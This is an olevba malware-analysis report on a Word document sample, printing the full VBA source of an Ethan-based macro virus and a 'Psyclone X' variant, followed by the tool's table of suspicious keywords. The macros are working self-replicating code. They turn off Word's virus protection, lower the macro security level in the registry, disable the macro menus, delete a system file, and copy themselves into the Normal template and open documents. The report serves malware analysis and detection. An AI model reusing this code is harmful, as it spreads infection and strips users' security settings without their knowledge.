olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan-based-8df095b9364ee524377aef5c1d64bfe74dfd4167
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Extra.cls 
in file: Virus.MSWord.Ethan-based-8df095b9364ee524377aef5c1d64bfe74dfd4167 - OLE stream: 'Macros/VBA/Extra'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Randomize
If Dir("c:\ethan.___", 6) = "" Then
Open "c:\ethan.___" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, a
Next i
Close #1
SetAttr "c:\ethan.___", 6
End If
If Dir("c:\class.sys") <> "" Then Kill "c:\class.sys"
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
t = ""
End If
If t <> "" Then
Open "c:\ethan.___" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
Private Sub CommandButton1_Click()
If MsgBox("Send form to Personnel?", vbOKCancel, Timesheet) = vbOK Then
    MsgBox "Please remember to type ""Personnel UK"" in the to field of the mail message which will appear next"
    SendForm
ActiveDocument.Close (wdDoNotSaveChanges)
End If
End Sub

Private Sub CommandButton2_Click()
SaveDoc
End Sub

Private Sub Document_New()

End Sub
Private Sub Document_Open()
 On Error Resume Next
 Set c = New DataObject
  If ActiveDocument.VBProject.VBComponents(1).Name <> "Extra" Then
    Set go = ActiveDocument.VBProject.VBComponents(1)
    saveit = True
   ElseIf NormalTemplate.VBProject.VBComponents(1).Name <> "Extra" Then
    Set go = NormalTemplate.VBProject.VBComponents(1)
  End If
  With go
   c.SetText Extra.VBProject.VBComponents(1).CodeModule.Lines(1, Extra.VBProject.VBComponents(1).CodeModule.CountOfLines)
   .CodeModule.deletelines 1, .CodeModule.CountOfLines
   .CodeModule.InsertLines 1, c.GetText
   .Name = "Extra"
  End With
 Options.ConfirmConversions = 0
 Options.SaveNormalPrompt = 0
 Options.VirusProtection = 0
  If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
     CommandBars("Macro").Controls("Security...").Enabled = 0
     System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
  End If
 CommandBars("Tools").Controls("Macro").Enabled = 0
  If saveit = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
' Word 97/2k.Extra - Psyclone X
' My first virus for the year 2k
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

